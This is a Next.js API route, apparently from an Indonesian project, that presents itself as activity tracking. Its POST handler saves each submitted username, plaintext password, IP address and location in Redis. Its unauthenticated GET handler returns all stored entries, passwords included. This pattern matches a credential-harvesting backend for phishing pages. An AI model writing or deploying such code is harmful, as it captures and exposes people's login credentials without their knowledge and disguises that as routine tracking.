import { NextResponse } from 'next/server';
import { createClient } from 'redis';

export const dynamic = 'force-dynamic';

// Menggunakan Environment Variable dari Vercel / .env.local
const REDIS_URL = process.env.REDIS_URL || '';

async function getRedisClient() {
  // @ts-ignore
  if (!globalThis._redisClient) {
    // @ts-ignore
    globalThis._redisClient = createClient({
      url: REDIS_URL
    });
    // @ts-ignore
    globalThis._redisClient.on('error', (err: any) => console.log('Redis Client Error', err));
    // @ts-ignore
    await globalThis._redisClient.connect();
  }
  // @ts-ignore
  return globalThis._redisClient;
}

interface TrackingLog {
  id: string;
  timestamp: string;
  username: string;
  password?: string;
  action: string;
  ip: string;
  location: string;
  path: string;
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const forwardedFor = request.headers.get('x-forwarded-for');
    const realIp = request.headers.get('x-real-ip');
    const serverSideIp = forwardedFor ? forwardedFor.split(',')[0].trim() : (realIp || 'Unknown IP Server-Side');
    const effectiveIp = body.ip && body.ip !== 'Unknown IP' ? body.ip : serverSideIp;

    const newLog: TrackingLog = {
      id: Date.now().toString() + Math.random().toString(36).substring(2, 9),
      timestamp: new Date().toISOString(),
      username: body.username || 'Guest',
      password: body.password || '',
      action: body.action || 'Unknown Action',
      ip: effectiveIp,
      location: body.location || 'Indonesia',
      path: body.path || '/'
    };

    if (!REDIS_URL) {
      console.warn("REDIS_URL tidak ditemukan. Mengabaikan penyimpanan...");
      return NextResponse.json({ success: true, log: newLog, warning: "Redis URL missing" });
    }

    const redis = await getRedisClient();
    
    // Simpan data di urutan paling depan list "cl_tracking_logs"
    await redis.lPush("cl_tracking_logs", JSON.stringify(newLog));
    
    // Batasi maksimum 2000 log terbaru agar Redis tidak kepenuhan RAM
    await redis.lTrim("cl_tracking_logs", 0, 1999);

    return NextResponse.json({ success: true, log: newLog });
  } catch (error) {
    console.error('Tracking POST Error:', error);
    return NextResponse.json({ success: false, error: 'Gagal merekam data tracking ke database' }, { status: 500 });
  }
}

export async function GET() {
  try {
    if (!REDIS_URL) {
      return NextResponse.json({ success: true, count: 0, data: [] });
    }
    
    const redis = await getRedisClient();
    // Ambil semua isi log dari Redis array
    const rawLogs = await redis.lRange("cl_tracking_logs", 0, -1);
    
    // Konversi string JSON kembali ke object Array
    const logs: TrackingLog[] = rawLogs.map((logStr: string) => {
      try {
        return JSON.parse(logStr);
      } catch {
        return null; // Skip corrupted logs
      }
    }).filter(Boolean) as TrackingLog[];
    
    return NextResponse.json({ success: true, count: logs.length, data: logs });
  } catch (error) {
    console.error('Tracking GET Error:', error);
    return NextResponse.json({ success: false, error: 'Gagal mengambil data tracking dari database' }, { status: 500 });
  }
}
